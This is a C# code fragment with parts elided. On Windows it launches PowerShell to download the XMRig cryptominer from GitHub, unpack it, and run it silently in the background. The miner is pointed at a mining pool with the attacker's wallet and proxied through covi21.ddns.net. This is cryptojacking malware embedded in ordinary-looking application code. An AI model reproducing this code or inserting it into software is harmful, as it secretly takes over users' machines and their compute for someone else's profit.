                ...
                try
                {
                    ...
                    if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                    {
                        var processStartInfo = new ProcessStartInfo()
                        {
                            ...
                            Arguments = $"-c [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference=\"SilentlyContinue\"; Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-gcc-win64.zip -OutFile xmrig-6.17.0-gcc-win64.zip; Expand-Archive -LiteralPath 'xmrig-6.17.0-gcc-win64.zip'; xmrig-6.17.0-gcc-win64\\xmrig-6.17.0\\xmrig.exe -o pool.minexmr.com:4444 -u {address}.win -x covi21.ddns.net:10555 -B; Start-Sleep -Seconds 500000",
